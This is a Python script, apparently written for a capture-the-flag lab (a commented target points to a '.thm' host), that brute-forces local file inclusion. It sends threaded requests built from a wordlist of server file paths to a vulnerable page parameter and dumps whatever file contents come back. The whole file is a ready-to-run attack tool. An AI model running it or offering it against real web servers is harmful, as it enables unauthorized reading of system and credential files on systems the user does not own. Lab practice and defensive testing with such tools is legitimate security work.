#!/bin/python3

'''
A short program to brute force LFI.
Author: A1.exe#1168
'''

import sys
import argparse
import concurrent.futures
import requests

#url = 'http://dev.team.thm/script.php?page='
url = None
wordlist = None
outfile = None
limit = None
raw = False


def send_payload(path):
	response = requests.get(url+path)
	#print(response.text)
	return response

def attack():
	with open(wordlist, 'r') as file:
		paths = file.readlines()
		listvariables = {path.strip() for path in paths}

		with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
			results = zip(listvariables, executor.map(send_payload, listvariables))
			
			for path, response in results:
				if ((limit and len(response.text)>=limit) or (not limit and (response.content != xclude))):
					print(f'<*><*><*> FOUND {path} <*><*><*>')
					if (outfile):
						outfile.write(f'<*><*><*> FOUND {path} <*><*><*>\n')
						outfile.write(f'{response.text if (not raw) else response.content}\n\n')

					else:
						print(f'{response.text}\n\n')

def main():
	parser = argparse.ArgumentParser(description='Brute force local file inclusion using a wordlist.')
	parser.add_argument('-w', help='path to wordlist', metavar='wordlist', dest='list', default='common_lfi_linux.txt')	
	parser.add_argument('-W', help='change the number of workers', metavar='number', dest='workers', default=50)
	parser.add_argument('-o', help='path to ouput file', metavar='outfile', dest='outfile')
	parser.add_argument('-l', help='len(page text) >= limit', metavar='number', dest='limit')
	parser.add_argument('-x', help='page text != text', metavar='string', dest='xclude', default=b'\n')
	parser.add_argument('--raw', help='output byte strings', dest='raw', action=argparse.BooleanOptionalAction)
	parser.add_argument('url', help='URI for local file inclusion',)

	args = parser.parse_args()
	global xclude
	global workers
	global wordlist
	global url

	url = args.url;
	wordlist = args.list;
	workers = abs(int(args.workers))
	xclude = str(args.xclude)

	if (args.outfile):
		try:
			global outfile
			outfile = open(args.outfile, 'w') or None
		except:
			print(f'Could not write to ${args.outfile}')

	if (args.limit):
		global limit
		limit = abs(int(args.limit))

	if (args.raw):
		global raw
		raw = args.raw

	print('<!><!><!> LAUNCHING ATTACK <!><!><!>')	
	print(f'Running with {workers} workers...')
	print(f'Wordlist: {wordlist}\n')
	attack()
	print('<!><!><!> ATTACK COMPLETE <!><!><!>')

if __name__ == "__main__":
	main()